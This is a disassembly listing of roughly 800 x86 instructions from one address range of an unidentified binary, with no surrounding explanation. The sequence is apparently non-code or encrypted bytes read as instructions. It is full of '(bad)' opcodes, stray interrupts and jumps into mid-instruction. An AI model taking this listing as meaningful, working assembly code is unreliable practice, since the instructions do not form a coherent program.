  425353:	pop    edx
  425354:	add    BYTE PTR [eax],al
  425356:	add    ch,cl
  425358:	jbe    0x425353
  42535a:	int    0x8d
  42535c:	mov    BYTE PTR [edx-0x327ef558],ch
  425362:	jbe    0x42535d
  425364:	arpl   bx,cx
  425366:	rol    BYTE PTR [eax+eax*4+0x3bedcd96],cl
  42536d:	ins    DWORD PTR es:[edi],dx
  42536e:	pop    esi
  42536f:	jbe    0x4253bd
  425371:	aam    0x3a
  425373:	pop    esi
  425374:	jbe    0x4252fe
  425376:	fdiv   DWORD PTR [edx]
  425378:	retf   0x8814
  42537b:	or     DWORD PTR [esi-0x69a6d0d1],edx
  425381:	das    
  425382:	adc    dh,bl
  425384:	in     eax,dx
  425385:	add    BYTE PTR [eax+0x2f960980],0xf1
  42538c:	lea    ebp,[edi]
  42538e:	retf   0x2f96
  425391:	or     DWORD PTR [eax+ecx*4],edx
  425394:	ins    BYTE PTR es:[edi],dx
  425395:	inc    ebx
  425396:	jbe    0x425320
  425398:	sub    BYTE PTR [ecx+0x7188d600],0xbd
  42539f:	stc    
  4253a0:	std    
  4253a1:	add    BYTE PTR [eax],al
  4253a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4253a4:	ror    BYTE PTR [eax-0x12326980],cl
  4253aa:	adc    ch,ch
  4253ac:	cmp    al,0x84
  4253ae:	add    BYTE PTR [eax+0x49bf985b],0x21
  4253b5:	xchg   BYTE PTR ds:0xc911a60a,dh
  4253bb:	jbe    0x4253ba
  4253bd:	inc    ecx
  4253be:	and    DWORD PTR [esi-0x128936cb],eax
  4253c4:	dec    ecx
  4253c5:	sub    DWORD PTR [esi-0x4a8936cb],eax
  4253cb:	jno    0x425383
  4253cd:	cli    
  4253ce:	arpl   bp,cx
  4253d0:	jbe    0x4253e3
  4253d2:	int    0x8d
  4253d4:	adc    DWORD PTR [edx+0x77cfffc0],ebx
  4253da:	sub    DWORD PTR [edx-0xfc486c5],0xd392bdd3
  4253e4:	repnz sub BYTE PTR [ebx-0x2d],dl
  4253e8:	or     dh,BYTE PTR [esi-0x7]
  4253eb:	leave  
  4253ec:	jbe    0x425393
  4253ee:	into   
  4253ef:	and    DWORD PTR [esi-0x628936cb],eax
  4253f5:	inc    esi
  4253f6:	sbb    DWORD PTR [ebp-0x528936de],esi
  4253fc:	mov    BYTE PTR [eax-0x34327f80],al
  425402:	int    0x76
  425404:	std    
  425405:	int    0x8d
  425407:	std    
  425408:	cmp    esi,eax
  42540a:	shl    edx,cl
  42540c:	sub    BYTE PTR [ebx],bh
  42540e:	jns    0x4253e3
  425410:	mov    ebp,0xcdd35392
  425415:	lea    edx,[ecx]
  425417:	int    0x96
  425419:	adc    DWORD PTR [ebx],edi
  42541b:	(bad)  
  42541d:	(bad)  
  42541f:	jmp    0x4253b3
  425421:	shr    edx,cl
  425423:	sub    BYTE PTR [ebx+0x13],dl
  425426:	das    
  425427:	rcl    ebx,1
  425429:	in     al,dx
  42542a:	outs   dx,BYTE PTR ds:[esi]
  42542b:	int    0x76
  42542d:	cmc    
  42542e:	int    0x8d
  425430:	cmc    
  425431:	sar    DWORD PTR [ebp-0x6d0d2cd8],cl
  425437:	push   ebx
  425438:	sar    DWORD PTR [ebx],cl
  42543a:	lds    ecx,FWORD PTR [edx]
  42543c:	jbe    0x425437
  42543e:	iret   
  42543f:	jbe    0x42543a
  425441:	jo     0x425400
  425443:	mov    ecx,0xa0000fe
  425448:	jbe    0x425443
  42544a:	int    0x76
  42544c:	stc    
  42544d:	int    0x8d
  42544f:	cmc    
  425450:	or     al,BYTE PTR ds:0xfc9dcf
  425456:	add    ch,cl
  425458:	jbe    0x425457
  42545a:	int    0x8d
  42545c:	std    
  42545d:	cmp    edi,DWORD PTR [ecx+0x3b]
  425460:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  425467:	push   ebx
  425468:	rol    DWORD PTR [edi+0x760af576],cl
  42546e:	cmc    
  42546f:	int    0x76
  425471:	in     eax,dx
  425472:	int    0x8d
  425474:	in     eax,dx
  425475:	cmp    esi,eax
  425477:	shl    edx,cl
  425479:	sub    BYTE PTR [ebx],bh
  42547b:	jns    0x425450
  42547d:	mov    ebp,0xcdd35392
  425482:	(bad)  
  425483:	std    
  425484:	int    0x96
  425486:	std    
  425487:	cmp    ecx,DWORD PTR [edi]
  425489:	cmp    ebx,ecx
  42548b:	shr    ebx,cl
  42548d:	xchg   edx,eax
  42548e:	shr    edx,cl
  425490:	sub    BYTE PTR [ebx+0x13],dl
  425493:	xor    edx,ebx
  425495:	int    0x8d
  425497:	cmc    
  425498:	inc    ebx
  425499:	jge    0x425473
  42549b:	mov    bl,0xcd
  42549d:	jbe    0x425454
  42549f:	int    0x8d
  4254a1:	mov    ch,0x3b
  4254a3:	jns    0x4254e0
  4254a5:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  4254ac:	push   ebx
  4254ad:	ror    DWORD PTR [edx],cl
  4254af:	jbe    0x4254aa
  4254b1:	leave  
  4254b2:	jbe    0x4254a1
  4254b4:	bound  ebx,QWORD PTR [edi]
  4254b6:	xchg   BYTE PTR ds:0x1ebddcd,dh
  4254bc:	add    BYTE PTR [eax-0x5a723280],0xcd
  4254c3:	jbe    0x42546a
  4254c5:	cmp    ecx,ecx
  4254c7:	shr    DWORD PTR [ebp-0x2cf0c4d8],cl
  4254cd:	jmp    0x425461
  4254cf:	push   ebx
  4254d0:	jge    0x42549f
  4254d2:	jbe    0x4254cd
  4254d4:	aad    0xbd
  4254d6:	or     dh,BYTE PTR [esi-0x63]
  4254d9:	int    0x76
  4254db:	mov    dl,cl
  4254dd:	or     BYTE PTR [ecx],0x76
  4254e0:	in     al,dx
  4254e1:	retf   0xec76
  4254e4:	int    0x8d
  4254e6:	stc    
  4254e7:	das    
  4254e8:	pop    ecx
  4254e9:	ins    DWORD PTR es:[edi],dx
  4254ea:	cmp    edx,ebx
  4254ec:	or     dh,BYTE PTR [esi-0xb]
  4254ef:	int    0x76
  4254f1:	in     eax,dx
  4254f2:	int    0x8d
  4254f4:	in     eax,dx
  4254f5:	cmp    edi,DWORD PTR [ecx-0x2d]
  4254f8:	mov    ebp,0xd3f03b92
  4254fd:	repnz sub BYTE PTR [ebx-0x2d],dl
  425501:	int    0x8d
  425503:	cmc    
  425504:	sub    edx,ebx
  425506:	int    0x5
  425508:	push   es
  425509:	popf   
  42550a:	cld    
  42550b:	add    BYTE PTR [eax],al
  42550d:	int    0x8d
  42550f:	popf   
  425510:	cmp    edx,ebx
  425512:	or     dh,BYTE PTR [esi-0x7]
  425515:	int    0x76
  425517:	std    
  425518:	int    0x8d
  42551a:	std    
  42551b:	cmp    edi,DWORD PTR [ecx+0x3b]
  42551e:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  425525:	push   ebx
  425526:	rol    DWORD PTR [ecx+0x76cd8876],cl
  42552c:	std    
  42552d:	int    0x8d
  42552f:	std    
  425530:	cmp    edi,DWORD PTR [ecx+0x3b]
  425533:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  42553a:	push   ebx
  42553b:	sar    DWORD PTR [esi],cl
  42553d:	jbe    0x4254ec
  42553f:	int    0x76
  425541:	adc    ebp,ecx
  425543:	lea    edx,[ecx]
  425545:	cmp    esi,eax
  425547:	cmp    edi,DWORD PTR [ecx-0x2d]
  42554a:	repnz sub bl,dl
  42554d:	mov    ebp,0xcdd35392
  425552:	lea    ebp,[ebp+0x62f7d43]
  425558:	imul   eax,DWORD PTR [eax],0x0
  42555b:	add    ch,cl
  42555d:	jbe    0x425514
  42555f:	int    0x8d
  425561:	mov    ch,0x3b
  425563:	jns    0x4255a0
  425565:	lock shl edx,cl
  425568:	sub    bl,dl
  42556a:	mov    ebp,0xd353aa92
  42556f:	int    0x8d
  425571:	stc    
  425572:	test   al,0x3b
  425574:	shl    DWORD PTR [ebx-0x35],cl
  425577:	rol    BYTE PTR [eax+eax*4+0x4edcd96],cl
  42557e:	in     eax,dx
  42557f:	xor    BYTE PTR [ebx],bh
  425581:	retf   
  425582:	pop    ebx
  425583:	call   0xbb05:0x2f888d5e
  42558a:	add    BYTE PTR [eax+0x2f024380],0x5
  425591:	rol    DWORD PTR [eax-0x44d07f80],1
  425597:	cwde   
  425598:	sub    al,0x5d
  42559a:	lahf   
  42559b:	xor    eax,0x8d0a8080
  4255a0:	std    
  4255a1:	or     cl,BYTE PTR [ebp+0xaf13b11]
  4255a7:	(bad)  
  4255a8:	stc    
  4255a9:	mov    eax,0xe3b813cd
  4255ae:	retf   
  4255af:	cmp    eax,DWORD PTR [eax]
  4255b1:	leave  
  4255b2:	jbe    0x4255a9
  4255b4:	adc    al,0x80
  4255b6:	add    BYTE PTR [eax+0x77fa43b8],0xc4
  4255bd:	mov    eax,0xb8fde6cd
  4255c2:	jecxz  0x42558d
  4255c4:	mov    eax,0xbb2ff93b
  4255c9:	(bad)  
  4255ca:	stc    
  4255cb:	iret   
  4255cc:	dec    esp
  4255cd:	into   
  4255ce:	mov    eax,0xd692de5e
  4255d3:	pop    edx
  4255d4:	das    
  4255d5:	mov    ebx,0xf58d0a89
  4255da:	mov    eax,0x4dd67d43
  4255df:	das    
  4255e0:	mov    ebx,0xa6cdfd8d
  4255e5:	mov    BYTE PTR [ecx],al
  4255e7:	fs push ds
  4255e9:	adc    ah,0x3b
  4255ec:	das    
  4255ed:	mov    ebx,0xa6cdfd8d
  4255f2:	mov    BYTE PTR [eax+0x1e4c692f],bh
  4255f8:	mov    eax,0x3bb8d3e3
  4255fd:	jge    0x4255b7
  4255ff:	pop    esi
  425600:	(bad)  
  425601:	cmc    
  425602:	aam    0x23
  425604:	leave  
  425605:	jbe    0x4255fc
  425607:	sbb    BYTE PTR [eax+0x76008080],al
  42560d:	stc    
  42560e:	int    0x7d
  425610:	mov    eax,0xb82c8e3b
  425615:	jecxz  0x4255e2
  425617:	mov    eax,0x82f98d5e
  42561c:	inc    ecx
  42561d:	in     al,dx
  42561e:	dec    edx
  42561f:	add    BYTE PTR [esi+0x11],dh
  425622:	leave  
  425623:	jbe    0x42561a
  425625:	push   ss
  425626:	add    BYTE PTR [eax-0x1944d080],0xfd
  42562d:	int    0xa6
  42562f:	mov    BYTE PTR [ebx],bh
  425631:	retf   
  425632:	pop    esp
  425633:	dec    esp
  425634:	sub    dl,ah
  425636:	push   ss
  425637:	add    BYTE PTR [esi-0x3],dh
  42563a:	add    al,0xe6
  42563c:	cmc    
  42563d:	sbb    BYTE PTR [edi],ch
  42563f:	push   es
  425640:	jb     0x425642
  425642:	add    BYTE PTR [eax],al
  425644:	cmp    ebp,DWORD PTR [ebp-0x56]
  425647:	arpl   bx,cx
  425649:	rol    BYTE PTR [eax+eax*4-0x47ee7233],cl
  425650:	jecxz  0x425625
  425652:	mov    eax,0x6d3b7d3b
  425657:	mov    eax,0x2f2c8e43
  42565c:	adc    eax,0x96b9ec6d
  425661:	int    0xed
  425663:	add    al,0xed
  425665:	mov    esp,0xc09a985b
  42566a:	inc    esp
  42566b:	add    dh,dl
  42566d:	mov    ch,cl
  42566f:	adc    DWORD PTR [ebp+0xf90b],edi
  425675:	iret   
  425676:	js     0x4256aa
  425678:	or     dh,BYTE PTR [esi+0x25]
  42567b:	iret   
  42567c:	js     0x4256f2
  42567e:	or     dh,BYTE PTR [esi+0x2d]
  425681:	iret   
  425682:	js     0x42563c
  425684:	or     dh,BYTE PTR [esi+0x35]
  425687:	iret   
  425688:	pop    es
  425689:	or     DWORD PTR [eax+0x760a8080],eax
  42568f:	cmp    eax,0x804107cf
  425694:	add    BYTE PTR [eax-0x30ba89f6],0x7
  42569b:	or     eax,0xa808080
  4256a0:	jbe    0x425672
  4256a2:	iret   
  4256a3:	pop    es
  4256a4:	out    dx,eax
  4256a5:	add    BYTE PTR [eax+0x55760a80],0xcf
  4256ac:	pop    es
  4256ad:	xor    BYTE PTR [ecx+0x760a8080],al
  4256b3:	pop    ebp
  4256b4:	iret   
  4256b5:	pop    es
  4256b6:	inc    edx
  4256b7:	add    DWORD PTR [eax+0x65760a80],0xcf1dd60a
  4256c1:	pop    es
  4256c2:	xchg   esp,eax
  4256c3:	add    DWORD PTR [eax+0x6d760a80],0x813d07cd
  4256cd:	add    BYTE PTR [eax-0x25c4af33],0xa
  4256d4:	xchg   esi,eax
  4256d5:	icebp  
  4256d6:	or     dl,BYTE PTR [esi-0x6269f56b]
  4256dc:	or     dl,BYTE PTR [esi+0x7d76c9a5]
  4256e2:	(bad)  
  4256e3:	mov    cl,0xde
  4256e5:	adc    ebx,DWORD PTR [ebp-0x43]
  4256e8:	or     ah,BYTE PTR [ebx]
  4256ea:	and    eax,0xcd0d760a
  4256ef:	lea    edi,[ebp-0x33]
  4256f2:	out    0xd,al
  4256f4:	cmp    edi,ecx
  4256f6:	adc    al,BYTE PTR [edx]
  4256f8:	jnp    0x425731
  4256fa:	ficom  WORD PTR [ebx]
  4256fc:	das    
  4256fd:	inc    ebp
  4256fe:	cli    
  4256ff:	xchg   edx,eax
  425700:	rcl    DWORD PTR [eax],cl
  425702:	xchg   edx,eax
  425703:	or     ah,dh
  425705:	mov    ch,0xcd
  425707:	out    0x7d,al
  425709:	int    0xa6
  42570b:	or     eax,0x3be1cd
  425710:	cmp    eax,DWORD PTR [ebx]
  425712:	shl    ebp,cl
  425714:	sub    BYTE PTR [ebx-0x10],dl
  425717:	int    0xe6
  425719:	mov    ch,0x61
  42571b:	add    BYTE PTR [eax-0x1dc49380],0x53
  425722:	cld    
  425723:	push   ebx
  425724:	lock or dl,dh
  425727:	stc    
  425728:	das    
  425729:	add    eax,0x808080f2
  42572e:	adc    dh,BYTE PTR [esi-0xf]
  425731:	(bad)  
  425732:	mov    esp,0xeb5f8bbd
  425737:	or     ah,BYTE PTR [ebx]
  425739:	and    eax,0x12958d31
  42573e:	jbe    0x4256dd
  425740:	(bad)  
  425741:	mov    esp,0x8d318790
  425746:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425747:	int    0x8d
  425749:	jge    0x425718
  42574b:	(bad)  
  42574c:	or     eax,0xcd7de6cd
  425751:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425752:	or     eax,0x212113b
  425757:	jnp    0x425790
  425759:	ficom  WORD PTR [ebx]
  42575b:	das    
  42575c:	inc    ebp
  42575d:	add    dl,BYTE PTR [edx-0x2cd7162d]
  425763:	out    dx,eax
  425764:	xchg   edx,eax
  425765:	cmp    ebx,ebp
  425767:	cmp    eax,DWORD PTR [ebx]
  425769:	push   ebx
  42576a:	or     al,0x53
  42576c:	clc    
  42576d:	add    al,0xd3
  42576f:	add    BYTE PTR [ecx+ebx*4],al
  425772:	add    BYTE PTR [edx],cl
  425774:	lea    edi,[ebp+0xa]
  425777:	(bad)  
  425778:	or     eax,0x53f18dcd
  42577d:	lea    edx,[ebp+0x761223d4]
  425783:	icebp  
  425784:	mov    edx,DWORD PTR [ebx]
  425786:	dec    edx
  425787:	stc    
  425788:	pop    edi
  425789:	sbb    al,bl
  42578b:	mov    ch,0x6b
  42578d:	xor    DWORD PTR [ebp-0x6289ed6b],ecx
  425793:	(bad)
  425796:	std    
  425797:	xor    DWORD PTR [ebp+0x121ceca5],ecx
  42579d:	(bad)  
  42579e:	icebp  
  42579f:	(bad)  
  4257a0:	mov    esp,0x76897abd
  4257a5:	xchg   ebp,eax
  4257a6:	adc    dh,BYTE PTR [esi-0x6f433963]
  4257ac:	add    al,0x12
  4257ae:	mov    dh,0xa5
  4257b0:	jmp    0x4257bc
  4257b2:	and    esp,DWORD PTR ds:0xcd7d8dcd
  4257b8:	lea    ecx,ds:0xcd7de6cd
  4257be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4257bf:	or     eax,0x92fc352f
  4257c4:	shr    ebx,cl
  4257c6:	sub    BYTE PTR [ebx],bh
  4257c8:	not    DWORD PTR [ebx-0xc]
  4257cb:	shr    ecx,cl
  4257cd:	xchg   edx,eax
  4257ce:	push   ebx
  4257cf:	lock adc al,BYTE PTR [edx]
  4257d2:	(bad)  
  4257d3:	aaa    
  4257d4:	ficom  WORD PTR [ebx]
  4257d6:	or     cl,BYTE PTR [ebp+0xa113b7d]
  4257dc:	(bad)  
  4257dd:	or     eax,0xcd7d8dcd
  4257e2:	(bad)  
  4257e3:	or     eax,0xcd7de6cd
  4257e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4257e9:	or     eax,0x212113b
  4257ee:	jnp    0x425827
  4257f0:	ficom  WORD PTR [ebx]
  4257f2:	das    
  4257f3:	inc    ebp
  4257f4:	add    dl,BYTE PTR [edx-0x2cd7162d]
  4257fa:	out    dx,eax
  4257fb:	xchg   edx,eax
  4257fc:	cmp    ebx,ebp
  4257fe:	cmp    eax,DWORD PTR [ebx]
  425800:	push   ebx
  425801:	or     al,0x53
  425803:	clc    
  425804:	push   ebx
  425805:	comiss xmm0,DWORD PTR [esi]
  425808:	xor    al,BYTE PTR [eax]
  42580a:	add    BYTE PTR [eax],al
  42580c:	int    0xd6
  42580e:	stc    
  42580f:	push   es
  425810:	imul   DWORD PTR [edi]
  425812:	add    eax,0x808080d1
  425817:	int    0x78
  425819:	fs int 0xe4
  42581c:	push   eax
  42581d:	fadd   QWORD PTR [edi+0x349acdff]
  425823:	int    0x6f
  425825:	and    al,0xcd
  425827:	jp     0x425855
  425829:	int    0xaa
  42582b:	sbb    al,0x87
  42582d:	cdq    
  42582e:	or     dl,BYTE PTR [esi+0x149acd0d]
  425834:	xchg   DWORD PTR [edi],ecx
  425836:	xchg   DWORD PTR [ecx+0xa],edi
  425839:	(bad)  
  42583a:	in     eax,dx
  42583b:	or     dh,BYTE PTR [esi-0x6b]
  42583e:	or     dl,BYTE PTR [esi+0x7bd543f5]
  425844:	xchg   DWORD PTR [edx],ecx
  425846:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425847:	cmc    
  425848:	cmp    ebx,edx
  42584a:	or     dl,BYTE PTR [esi-0xa69a15b]
  425850:	fcom   st(4)
  425852:	in     al,dx
  425853:	xchg   ebp,ecx
  425855:	jbe    0x4257ec
  425857:	int    0xa6
  425859:	or     eax,0x5b24bb2f
  42585e:	inc    ebx
  42585f:	call   0x14aa:0x436b771c
  425866:	ja     0x425810
  425868:	int    0x84
  42586a:	mov    al,0xcd
  42586c:	xchg   esi,eax
  42586d:	mov    ch,cl
  42586f:	and    al,0x1f
  425871:	or     dl,BYTE PTR [esi-0x30867803]
  425877:	xchg   esi,eax
  425878:	sbb    eax,0x9633a987
  42587d:	mov    BYTE PTR [edx],cl
  42587f:	jbe    0x425892
  425881:	or     dl,BYTE PTR [esi-0x4a89368b]
  425887:	push   ebx
  425888:	add    BYTE PTR [eax-0x2693280],0x4
  42588f:	pusha  
  425890:	adc    dh,0x28
  425893:	jo     0x425862
  425895:	jbe    0x42590c
  425897:	int    0x54
  425899:	xor    BYTE PTR [ebp+0xfddd],bh
  42589f:	int    0xd6
  4258a1:	stc    
  4258a2:	int    0x8d
  4258a4:	in     eax,dx
  4258a5:	push   es
  4258a6:	ins    DWORD PTR es:[edi],dx
  4258a7:	aam    0x85
  4258a9:	int    0x76
  4258ab:	std    
  4258ac:	or     bl,BYTE PTR [ecx*8+0x76041176]
  4258b3:	std    
  4258b4:	test   BYTE PTR [eax],al
  4258b6:	lea    esi,[ebp-0x69321c2a]
  4258bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4258bd:	push   edx
  4258be:	or     dl,BYTE PTR [esi-0xa69bc5b]
  4258c4:	or     dh,0xaa
  4258c7:	int    0x79
  4258c9:	test   al,0x63
  4258cb:	retf   
  4258cc:	rol    BYTE PTR [eax+eax*4-0x6712326a],cl
  4258d3:	int    0xd6
  4258d5:	mov    BYTE PTR [eax],al
  4258d7:	pop    ecx
  4258d8:	adc    DWORD PTR [ecx+0x76cd8080],eax
  4258de:	mov    BYTE PTR [ebp+0xfee4],bh
  4258e4:	int    0x7
  4258e6:	cmp    eax,0x3b808081
  4258eb:	retf   
  4258ec:	pop    esi
  4258ed:	mov    BYTE PTR [eax-0x322ce8d1],ch
  4258f3:	shl    DWORD PTR [esi-0x327f7b2e],cl
  4258f9:	fwait
  4258fa:	sbb    eax,0x5b808081
  4258ff:	cwde   
  425900:	int    0x11
  425902:	pop    ebp
  425903:	lahf   
  425904:	xor    eax,0x4eec8080
  425909:	cmp    edi,DWORD PTR [ebp-0x48]
  42590c:	jecxz  0x4258d9
  42590e:	mov    eax,0xd2044a0a
  425913:	xchg   edx,eax
  425914:	add    al,0x79
  425916:	xchg   edx,eax
  425917:	das    
  425918:	mov    ebx,0x7d43b84e
  42591d:	(bad)  
  42591e:	repz cmp ebp,DWORD PTR [ebp-0x58]
  425922:	mov    eax,0x8cd920a
  425927:	sbb    eax,0x63808081
  42592c:	lds    ebx,FWORD PTR [edx+0x7cdf9cd]
  425932:	sbb    eax,0xd3808081
  425937:	jmp    0xed0be0c2
  42593c:	dec    edx
  42593d:	add    DWORD PTR [edx],eax
  42593f:	add    DWORD PTR [ecx],0xffffffeb
  425942:	mov    esi,0x526c8809
  425947:	retf   0x14a
  42594a:	cli    
  42594b:	sbb    dh,dl
  42594d:	adc    BYTE PTR [ecx-0x80],bh
  425950:	or     ch,0x7
  425953:	sbb    eax,0x87808081
  425958:	leave  
  425959:	stos   BYTE PTR es:[edi],al
  42595a:	lds    edx,FWORD PTR [esi-0x12ed1233]
  425960:	mov    al,0x80
  425962:	add    BYTE PTR [eax+0xabd5f5b],0x23
  425969:	and    eax,0x76c99a98
  42596e:	cmc    
  42596f:	xchg   ecx,eax
  425970:	aaa    
  425971:	ficom  WORD PTR [ebx]
  425973:	or     cl,BYTE PTR [ebp-0x12893607]
  425979:	(bad)  
  42597a:	aaa    
  42597b:	ficom  WORD PTR [ebx]
  42597d:	or     cl,BYTE PTR [ebp-0x3692c4ef]
  425983:	jbe    0x425942
  425985:	dec    ecx
  425986:	and    DWORD PTR [esi-0x28936cb],eax
  42598c:	inc    ecx
  42598d:	and    DWORD PTR [esi-0xe8936cb],eax
  425993:	out    0x37,al
  425995:	ficom  WORD PTR [ebx]
  425997:	or     cl,BYTE PTR [ebp+0x5d76c995]
  42599d:	fidiv  WORD PTR [edi]
  42599f:	ficom  WORD PTR [ebx]
  4259a1:	or     cl,BYTE PTR [ebp-0x1289329b]
  4259a7:	int    0x96
  4259a9:	adc    DWORD PTR [edi],ebp
  4259ab:	inc    ebp
  4259ac:	icebp  
  4259ad:	xchg   edx,eax
  4259ae:	shl    ebx,cl
  4259b0:	xchg   edx,eax
  4259b1:	int    0x96
  4259b3:	in     eax,dx
  4259b4:	int    0xd6
  4259b6:	adc    ebx,edx
  4259b8:	jmp    0x4229:0xbea6c328
  4259bf:	cmp    ecx,ecx
  4259c1:	cmp    esi,edi
  4259c3:	push   ebx
  4259c4:	jns    0x4259d0
  4259c6:	jbe    0x42596d
  4259c8:	iret   
  4259c9:	jbe    0x425978
  4259cb:	or     dh,BYTE PTR [esi+0xd]
  4259ce:	int    0x76
  4259d0:	or     eax,0x8621d169
  4259d5:	xor    eax,0x37b680c9
  4259da:	ficom  WORD PTR [ebx]
  4259dc:	or     bh,BYTE PTR [esp+eax*4-0x33]
  4259e0:	(bad)  
  4259e1:	std    
  4259e2:	int    0x96
  4259e4:	std    
  4259e5:	cmp    ecx,DWORD PTR [edi]
  4259e7:	shr    ebx,cl
  4259e9:	xchg   edx,eax
  4259ea:	sar    bh,0x9c
  4259ed:	cmp    esi,ecx
  4259ef:	shr    edx,cl
  4259f1:	sub    BYTE PTR [ebx+0x13],dl
  4259f4:	int    0x96
  4259f6:	std    
  4259f7:	int    0xa6
  4259f9:	std    
  4259fa:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  425a00:	popf   
  425a01:	shl    ebp,cl
  425a03:	sub    BYTE PTR [ebx-0x2b],dl
  425a06:	xchg   DWORD PTR [ebx],edx
  425a08:	int    0x96
  425a0a:	std    
  425a0b:	int    0xa6
  425a0d:	std    
  425a0e:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  425a14:	popf   
  425a15:	shl    ebp,cl
  425a17:	sub    BYTE PTR [ebx-0x2b],dl
  425a1a:	xchg   DWORD PTR [ebx],edx
  425a1c:	int    0x96
  425a1e:	std    
  425a1f:	int    0xa6
  425a21:	std    
  425a22:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  425a28:	popf   
  425a29:	shl    ebp,cl
  425a2b:	sub    BYTE PTR [ebx-0x2b],dl
  425a2e:	xchg   DWORD PTR [ebx],edx
  425a30:	or     cl,bh
  425a32:	nop
  425a33:	add    BYTE PTR [eax],al
  425a35:	add    ch,cl
  425a37:	lea    edi,[ebp+0x3bbd96cd]
  425a3d:	icebp  
  425a3e:	cmp    ecx,DWORD PTR [edi]
  425a40:	shr    edx,cl
  425a42:	sub    bl,dl
  425a44:	jmp    0x4259d8
  425a46:	push   ebx
  425a47:	adc    ecx,ebp
  425a49:	xchg   esi,eax
  425a4a:	mov    ebp,0x3bbda6cd
  425a4f:	cdq    
  425a50:	cmp    ebx,DWORD PTR [ebp-0x2c6d0c2d]
  425a56:	in     eax,0x28
  425a58:	push   ebx
  425a59:	aad    0xa
  425a5b:	int3   
  425a5c:	pop    ss
  425a5d:	aam    0x0
  425a5f:	add    BYTE PTR [eax],al
  425a61:	int    0x8d
  425a63:	dec    esp
  425a64:	int    0x89
  425a66:	int    0x96
  425a68:	std    
  425a69:	int    0xa6
  425a6b:	std    
  425a6c:	int    0x7e
  425a6e:	jo     0x425aab
  425a70:	popf   
  425a71:	cmp    ebx,DWORD PTR [ecx-0x2c6d0c2d]
  425a77:	in     eax,0x28
  425a79:	push   ebx
  425a7a:	aad    0xa
  425a7c:	int3   
  425a7d:	pop    ss
  425a7e:	aam    0x0
  425a80:	add    BYTE PTR [eax],al
  425a82:	int    0x8d
  425a84:	xor    ch,cl
  425a86:	xchg   esi,eax
  425a87:	xor    BYTE PTR [ebx],bh
  425a89:	icebp  
  425a8a:	cmp    ecx,DWORD PTR [edi]
  425a8c:	shr    edx,cl
  425a8e:	sub    bl,dl
  425a90:	jmp    0x425a24
  425a92:	push   ebx
  425a93:	adc    ecx,ebp
  425a95:	xchg   esi,eax
  425a96:	std    
  425a97:	int    0xa6
  425a99:	std    
  425a9a:	cmp    ebx,DWORD PTR [ebp+0x3bfd76cd]
  425aa0:	cdq    
  425aa1:	shl    ebx,cl
  425aa3:	xchg   edx,eax
  425aa4:	shl    ebp,cl
  425aa6:	sub    BYTE PTR [ebx-0x2b],dl
  425aa9:	int    0xa6
  425aab:	std    
  425aac:	cmp    edi,DWORD PTR [ecx-0x2d]
  425aaf:	mov    ebp,0xfff40492
  425ab4:	shl    ebp,cl
  425ab6:	sub    BYTE PTR [ebx-0x3b],dl
  425ab9:	xchg   ecx,esi
  425abb:	int    0x76
  425abd:	adc    al,0xa
  425abf:	int3   
  425ac0:	pop    ss
  425ac1:	aam    0x0
  425ac3:	add    BYTE PTR [eax],al
  425ac5:	int    0x8d
  425ac7:	adc    al,0x4
  425ac9:	add    bh,bh
  425acb:	shl    edx,cl
  425acd:	sub    BYTE PTR [ebx],bh
  425acf:	jns    0x425aa4
  425ad1:	mov    ebp,0xcdd35392
  425ad6:	(bad)  
  425ad7:	std    
  425ad8:	int    0x96
  425ada:	std    
  425adb:	add    al,0xfb
  425add:	(bad)  
  425ade:	cmp    ecx,DWORD PTR [edi]
  425ae0:	shr    edx,cl
  425ae2:	sub    bl,dl
  425ae4:	jmp    0x425a78
  425ae6:	push   ebx
  425ae7:	adc    ecx,ebp
  425ae9:	xchg   esi,eax
  425aea:	std    
  425aeb:	int    0xa6
  425aed:	std    
  425aee:	cmp    ebx,DWORD PTR [ecx-0x2c000bfc]
  425af4:	repz xchg edx,eax
  425af6:	shl    ebp,cl
  425af8:	sub    BYTE PTR [ebx-0x2b],dl
  425afb:	xchg   DWORD PTR [ebx],edx
  425afd:	int    0x96
  425aff:	std    
  425b00:	int    0xa6
  425b02:	std    
  425b03:	cmp    ebx,DWORD PTR [ecx-0x2c000bfc]
  425b09:	in     eax,0x28
  425b0b:	shl    ebx,cl
  425b0d:	xchg   edx,eax
  425b0e:	push   ebx
  425b0f:	aad    0x87
  425b11:	adc    ecx,DWORD PTR [edx]
  425b13:	add    eax,0xd4cf
  425b18:	add    bh,cl
  425b1a:	push   es
  425b1b:	nop
  425b1c:	add    BYTE PTR [eax],al
  425b1e:	add    BYTE PTR [eax-0x33],dh
  425b21:	jbe    0x425b20
  425b23:	int    0x8d
  425b25:	std    
  425b26:	sar    bh,0x63
  425b29:	cmp    edi,DWORD PTR [ecx+0x3b]
  425b2c:	or     al,0xd3
  425b2e:	mov    ebp,0x28f2d392
  425b33:	push   ebx
  425b34:	shl    DWORD PTR [eax-0x33],cl
  425b37:	jbe    0x425b65
  425b39:	iret   
  425b3a:	or     DWORD PTR [ecx-0x80],eax
  425b3d:	add    BYTE PTR [eax+0x3d01cd71],0x81
  425b44:	add    BYTE PTR [eax-0x69ffb000],0x24
  425b4b:	int    0x8d
  425b4d:	push   esp
  425b4e:	or     al,BYTE PTR [ecx-0x32528933]
  425b54:	lea    esi,[ebp-0x6d82bad1]
  425b5a:	shr    ebx,cl
  425b5c:	xchg   edx,eax
  425b5d:	int    0x8d
  425b5f:	lods   eax,DWORD PTR ds:[esi]
  425b60:	int    0x96
  425b62:	mov    ch,0x3b
  425b64:	leave  
  425b65:	cmp    ebx,edx
  425b67:	push   ebx
  425b68:	icebp  
  425b69:	bound  eax,QWORD PTR [eax]
  425b6b:	(bad)  
  425b6c:	xor    al,0xd3
  425b6e:	repnz sub BYTE PTR [eax],al
